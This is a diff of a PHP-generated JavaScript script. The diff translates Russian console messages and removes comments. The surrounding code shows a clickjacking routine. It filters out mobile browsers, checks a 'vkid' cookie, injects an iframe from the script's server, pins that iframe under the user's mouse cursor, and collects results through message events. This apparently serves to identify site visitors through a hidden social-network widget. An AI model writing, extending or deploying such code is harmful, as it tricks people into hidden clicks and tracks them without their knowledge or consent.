@@ -23,20 +23,19 @@
 <?php
         if(!$domain){
 ?>
-    console.info("Домен не подключён");
+    console.info("Domain not found");
 
     delScript();
 <?php
         }else{
 ?>
     if(domain !== "<?php echo($domain);?>"){
-        console.info("Домен не подключён");
+        console.info("Domain not connected");
 
         delScript();
     }else{
         var loadePage;
 
-        // Проверка вида браузера
         if(navigator.userAgent.match("Android|BackBerry|phone|iPad|iPod|IEMobile|Nokia|Mobile|MSIE|iPhone|webOS|Windows Phone|Explorer|Trident")){
             loadePage = false;
         }else{
@@ -49,7 +48,6 @@
             loadePage = false;
         };
 
-        // Проверка кук
         if(!navigator.cookieEnabled){
             loadePage = false;
         };
@@ -66,7 +64,7 @@
 
             Event = (function(){
                 var guid = 0
-                
+
                 function fixEvent(event){
                     event = event || window.event;
 
@@ -228,7 +226,6 @@
             if(getCookie("vkid")){
                 delScript();
             }else{
-                // Добавление iframe
                 var i = d.createElement("iframe");
                     i.src = "//<?php echo($config["script_dir"]);?>iframe.php?key=<?php echo($key);?>";
                     i.id = "iframe-0";
@@ -243,7 +240,6 @@
                     i.parent = undefined;
                 d.body.appendChild(i);
 
-                // Прикрепление фрейма к курсору
                 mv = function(event){
                     var i0 = d.getElementById("iframe-0");
 
@@ -260,8 +256,6 @@
 
                 Event.add(d, "mousemove", mv);
 
-                // Очистка отработанных скриптов
-                // Устоновка кук
                 cd = function(event){
                     var strData = "" + event.data;
 
